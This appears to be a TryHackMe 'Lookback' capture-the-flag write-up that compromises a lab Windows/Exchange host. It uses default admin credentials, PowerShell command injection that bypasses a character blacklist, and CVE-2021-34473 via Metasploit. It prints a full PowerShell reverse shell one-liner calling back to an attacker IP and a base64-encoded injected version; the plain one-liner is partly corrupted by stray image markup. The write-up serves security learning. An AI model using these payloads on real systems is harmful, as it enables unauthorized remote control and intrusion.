---
title: Tryhackme Lookback
categories: [Writeup tryhackme]
tags: [tryhackme, pentest]
---

```bash
nmap -T4 -A 10.10.46.161 -Pn
```

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-15.jpg){:width="70%"}

The Nmap port scan reveals open ports 80, 443, and 3398. Now, let's begin investigating the web application.

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback.jpg){:width="70%"}

After inspecting the web application, we observed that accessing 'robots.txt' or 'sitemap.xml' redirects to an Exchange Outlook login page.

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-16.jpg){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-17.jpg){:width="70%"}

Using common credentials (admin), we attempted to log in to Outlook. However, upon logging in, an error occurred: "A mailbox couldn't be found for THM\\admin."

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-18.jpg){:width="70%"}

Using  [exchange version script checker](https://github.com/kh4sh3i/exchange-penetration-testing/blob/main/get_exchange_version.py) which uses a web request to access the URL, then parses the response to extract the Build number. After obtaining the Build number, it maps it to the corresponding Exchange Server version using the `buildnumber_to_version` function. In this case, the Build number 15.2.858 corresponds to Exchange Server 2019, as indicated in the output.

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-19.jpg){:width="70%"}

We also discovered a test directory that requires credentials. Since the developer might reuse passwords, we can attempt to use the previously obtained '**admin**' username with the same password for authentication.

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-20.jpg){:width="70%"}

It appears that the LOG ANALYZER application allows users to input a path and execute PowerShell commands to read the logs. We can bypass the character blacklisting by appending `')`,  `|` `#` to our input.

```powershell
BitlockerActiveMonitoringLogs') | systeminfo # 
```

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-21.jpg){:width="70%"}


The LOG ANALYZER application is found to be susceptible to OS injection commands, which means an attacker can execute unauthorized commands on the underlying operating system. By exploiting this vulnerability, an attacker could potentially gain unauthorized access and control over the system. This process can be escalated further to achieve a "reverse shell," allowing the attacker to establish a persistent connection to the target system and execute commands remotely.

```powershell
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.169.51', 4000);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[){:width="70%"}$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```

Base64 encoded command with bypass blacklisting

```powershell
BitlockerActiveMonitoringLogs') | powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEAMgAwAC4AMQA2ADMAIgAsADQAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA #
```

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-22.jpg){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-23.jpg){:width="70%"}

TODO.txt
```plaintext
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

```bash
search cve:CVE-2021-34473
info 0
```

Earlier, we discovered the Exchange Server build number, which is 15.2.858. Upon examining the TODO list, we noticed that the developer forgot to update the Security Exchange. This oversight raises concerns about a potential vulnerability in the Exchange server. Subsequently, we identified that it is susceptible to CVE-2021-34473, the Microsoft Exchange Server Remote Code Execution Vulnerability.

This vulnerability arises from a faulty URL normalization process, enabling access to an arbitrary backend URL while running under the Exchange Server machine account. Although not as powerful as the SSRF in ProxyLogon, it allows manipulation only of the path part of the URL.

To exploit this vulnerability, we can use the email address obtained from the TODO.txt, which is [dev-infrastracture-team@thm.local](mailto:dev-infrastracture-team@thm.local). Armed with this information, we can proceed to carry out the exploit using msfconsole.

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-24.jpg){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-25.jpg){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-07-25-THM-Lookback-26.jpg){:width="70%"}

We are conducting a file search on the system, specifically looking for files named "flag.txt" in the "Administrator" user's directory. The root flag is located at "C:\\Users\\Administrator\\Documents" 

--- 
## References
- <https://github.com/kh4sh3i/exchange-penetration-testing/blob/main/get_exchange_version.py>
- <https://packetstormsecurity.com/files/166153/Microsoft-Exchange-Server-Remote-Code-Execution.html>
- <https://tryhackme.com/room/lookback> 